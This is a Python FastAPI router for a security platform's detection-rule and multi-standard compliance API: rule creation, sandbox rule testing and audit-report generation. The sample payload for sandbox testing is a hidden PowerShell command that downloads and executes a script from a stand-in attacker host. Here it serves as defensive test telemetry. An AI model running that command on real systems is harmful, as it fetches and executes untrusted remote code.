"""
backend/app/api/v1/compliance_detection_eng.py
=============================================
Phase 38 Autonomous Detection Engineering & Multi-Standard Compliance API Router.
Exposes:
- Compliance Posture & Detection Scorecard
- Candidate Detection Rules (Sigma / YARA-L)
- Detection Rule Sandbox Testing Engine
- Multi-Standard Regulatory Controls (SOC 2, ISO 27001, HIPAA, FedRAMP, PCI-DSS)
- Auditor Attestation Reports & Report Generator
"""

from typing import Dict, Any, List, Optional
from fastapi import APIRouter, Depends, Query, Body
from sqlalchemy.ext.asyncio import AsyncSession
from pydantic import BaseModel, Field

from backend.app.database import get_db
from backend.app.core.tenant import resolve_tenant_context, TenantContext, get_enforced_tenant_id
from backend.app.services.detection_engineering_service import DetectionEngineeringService
from backend.app.services.compliance_posture_service import CompliancePostureService
from backend.app.services.evidence_collector_service import EvidenceCollectorService

router = APIRouter(prefix="/compliance-detection", tags=["Phase 38 - Detection Engineering & Compliance"])


# ==================== Request Payloads ====================

class CreateRuleRequest(BaseModel):
    rule_name: str = Field(..., example="Detect Tor Ingress Traffic")
    rule_type: str = Field(default="SIGMA_YAML", example="SIGMA_YAML")
    mitre_technique_id: str = Field(default="T1090.003", example="T1090.003")
    rule_syntax_payload: str = Field(..., example="title: Tor Ingress\nlogsource:\n  category: network\ncondition: selection")


class TestSandboxRequest(BaseModel):
    rule_id: str = Field(..., example="rule-uuid")
    test_payload: str = Field(..., example="powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://evil.com')")


class GenerateReportRequest(BaseModel):
    framework: str = Field(..., example="SOC2_TYPE2")
    generated_by: str = Field(default="compliance_officer", example="compliance_officer")


# ==================== Endpoints ====================

@router.get("/summary", summary="Get Compliance & Detection Engineering Posture Scorecard")
async def get_summary(
    context: TenantContext = Depends(resolve_tenant_context),
    db: AsyncSession = Depends(get_db)
):
    """Calculates consolidated compliance and detection engineering posture."""
    tenant_id = get_enforced_tenant_id(context)
    return await EvidenceCollectorService.get_summary(db=db, tenant_id=tenant_id)


# Detection Rules
@router.get("/detection-rules", summary="List Autonomous Detection Rules")
async def list_detection_rules(
    limit: int = Query(50, ge=1, le=100),
    context: TenantContext = Depends(resolve_tenant_context),
    db: AsyncSession = Depends(get_db)
):
    """Lists active autonomous detection rules."""
    tenant_id = get_enforced_tenant_id(context)
    return await DetectionEngineeringService.list_rules(db=db, tenant_id=tenant_id, limit=limit)


@router.post("/detection-rules", summary="Create Candidate Detection Rule")
async def create_detection_rule(
    req: CreateRuleRequest,
    context: TenantContext = Depends(resolve_tenant_context),
    db: AsyncSession = Depends(get_db)
):
    """Creates a candidate detection-as-code rule."""
    tenant_id = get_enforced_tenant_id(context)
    return await DetectionEngineeringService.create_rule(
        db=db,
        tenant_id=tenant_id,
        rule_name=req.rule_name,
        rule_type=req.rule_type,
        mitre_technique_id=req.mitre_technique_id,
        rule_syntax_payload=req.rule_syntax_payload
    )


@router.post("/detection-rules/test-sandbox", summary="Test Detection Rule inside Sandbox")
async def test_rule_sandbox(
    req: TestSandboxRequest,
    context: TenantContext = Depends(resolve_tenant_context),
    db: AsyncSession = Depends(get_db)
):
    """Executes a detection rule inside the safe sandbox against test telemetry."""
    tenant_id = get_enforced_tenant_id(context)
    return await DetectionEngineeringService.test_rule_sandbox(
        db=db,
        tenant_id=tenant_id,
        rule_id=req.rule_id,
        test_payload=req.test_payload
    )


# Compliance Controls
@router.get("/compliance-controls", summary="List Compliance Controls across Frameworks")
async def list_compliance_controls(
    framework: Optional[str] = Query(None, example="SOC2_TYPE2"),
    limit: int = Query(50, ge=1, le=100),
    context: TenantContext = Depends(resolve_tenant_context),
    db: AsyncSession = Depends(get_db)
):
    """Lists compliance controls and automated evidence assessments."""
    tenant_id = get_enforced_tenant_id(context)
    return await CompliancePostureService.list_controls(
        db=db,
        tenant_id=tenant_id,
        framework=framework,
        limit=limit
    )


# Reports
@router.get("/compliance-reports", summary="List Compliance Audit Reports")
async def list_compliance_reports(
    limit: int = Query(50, ge=1, le=100),
    context: TenantContext = Depends(resolve_tenant_context),
    db: AsyncSession = Depends(get_db)
):
    """Lists compliance audit reports."""
    tenant_id = get_enforced_tenant_id(context)
    return await EvidenceCollectorService.list_reports(db=db, tenant_id=tenant_id, limit=limit)


@router.post("/compliance-reports/generate", summary="Generate Cryptographic Compliance Audit Report")
async def generate_compliance_report(
    req: GenerateReportRequest,
    context: TenantContext = Depends(resolve_tenant_context),
    db: AsyncSession = Depends(get_db)
):
    """Generates a cryptographic auditor attestation report."""
    tenant_id = get_enforced_tenant_id(context)
    return await EvidenceCollectorService.generate_report(
        db=db,
        tenant_id=tenant_id,
        framework=req.framework,
        generated_by=req.generated_by
    )
